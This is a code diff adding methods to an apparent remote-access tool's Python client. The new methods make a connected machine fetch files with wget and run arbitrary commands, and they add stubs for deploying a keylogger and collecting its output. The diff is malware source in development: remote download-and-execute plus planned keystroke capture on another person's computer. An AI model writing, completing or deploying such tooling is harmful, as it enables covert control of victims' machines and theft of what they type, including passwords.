@@ -50,6 +50,37 @@ class Client:
             output = self.conn.recv(header).decode(FORMAT)
             return output
 
+    def deployKeylogger(self) -> bool:
+        """
+        Returns a boolean values indicating whether keylogger is enabled or disabled
+        :return:
+        """
+        # Toggling will be done client-side, technically server-side
+        pass
+
+    def getKeyloggerOutput(self):
+        """
+        Returns a list of bytes file of all outputs
+        :return:
+        """
+        pass
+
+    def downloadSoftware(self, url: str) -> str:
+        """
+        Downloads file onto computer and returns output from other computer
+        :param url:
+        :return:
+        """
+        return self.command(f"wget {url}")
+
+    def deploySoftware(self, command: str):
+        """
+        Executes file that was downloaded
+        :param command:
+        :return:
+        """
+        return self.command(command)
+
 
 client = Client(ADDR)
 
